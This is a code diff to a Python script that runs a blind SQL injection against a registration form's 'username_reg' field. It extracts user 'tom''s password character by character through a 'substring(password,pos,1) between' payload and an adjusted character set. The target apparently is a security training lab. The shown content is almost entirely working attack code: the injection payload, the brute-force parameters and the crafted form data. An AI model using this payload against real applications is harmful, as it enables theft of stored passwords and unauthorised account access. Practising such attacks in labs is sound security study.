@@ -9,12 +9,14 @@ HEADERS = {
 }
 
 # The set of characters to test (adjust as needed)
-charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-!@#$%^&*()"
+charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-@#&"
 max_length = 25  # adjust based on expected password length
 
 def test_char(pos, ch):
     # Craft the injection payload
+    # injection = f"tom' AND substring(password,{pos},1)='{ch}' -- "
     injection = f"tom'+and+substring(password,{pos},1)+between+'{ch}'+and+'{ch}'%3B--"
+
     form_data = (
         f"username_reg={injection}&"
         "email_reg=abc%40gmail.com&"
